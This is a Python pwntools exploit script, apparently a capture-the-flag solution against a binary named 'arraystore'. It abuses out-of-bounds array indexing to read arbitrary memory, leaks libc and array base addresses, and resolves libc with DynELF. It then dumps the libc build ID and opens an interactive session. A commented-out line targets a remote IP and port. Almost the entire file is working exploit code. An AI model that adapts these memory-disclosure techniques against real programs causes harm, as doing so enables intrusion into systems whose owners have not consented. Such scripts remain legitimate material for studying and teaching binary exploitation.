from pwn import *
import binascii

#r = process('./arraystore')
#r = remote('34.124.157.94', 10546)
r = remote('localhost', 10546)

def read(idx):
    r.recvuntil(b"Read/Write/Print?: ")
    r.sendline(b"R")
    r.recvuntil(b"Index: ")
    r.sendline(str(idx).encode())
    r.recvuntil(b"Value: ")
    return int(r.recvline().strip())

def write(idx, val):
    r.recvuntil(b"Read/Write/Print?: ")
    r.sendline(b"W")
    r.recvuntil(b"Index: ")
    r.sendline(str(idx).encode())
    r.recvuntil(b"Value: ")
    r.sendline(str(val).encode())

for i in range(100):
    print(i+100, hex(read(i+100 - 0x10000000000000000//8)))
libc = read(-19)
array_base = read(111 - 0x10000000000000000//8) - 0x7fff880157a9 + 0x7fff88015140
print("libc:", hex(libc))
print("array_base:", hex(array_base))
def leak(address):
    data = read((address - array_base - 0x10000000000000000)//8)
    if data < 0:
        data += 0x10000000000000000
    #print("leak:", hex(address), hex(data))
    return p64(data)

d = DynELF(leak, libc)
libc_base = d.lookup(None, 'libc')
print(hex(libc_base))


buildid = b""
for i in range(3):
    buildid += leak(libc_base + 0x390 + i*8)
print(binascii.hexlify(buildid)[:40])

r.interactive()